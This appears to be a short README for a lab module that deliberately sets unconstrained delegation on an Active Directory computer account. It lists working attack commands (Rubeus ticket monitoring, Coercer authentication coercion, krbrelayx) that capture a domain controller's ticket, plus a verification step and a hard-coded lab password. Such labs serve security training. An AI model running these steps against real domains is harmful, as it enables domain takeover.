# unconstrained-computer

Sets `TrustedForDelegation` on the target member server's computer account.

Attack (local admin on the host, then coerce a DC to authenticate to it and capture its TGT):

    # on the host: Rubeus.exe monitor /interval:5 /filteruser:<DC>$
    coercer coerce -l <host fqdn> -t <dc ip> -u <user> -p 'Aa1234567890!'
    # or from Linux with krbrelayx after adding a DNS record and the host's machine key

How to verify:

    findDelegation.py <domain>/<user>:'Aa1234567890!' -dc-ip <dc ip>   # <host>$  Unconstrained

Disable clears `TrustedForDelegation`. Not cleaned: TGTs captured during the attack (valid until they expire).
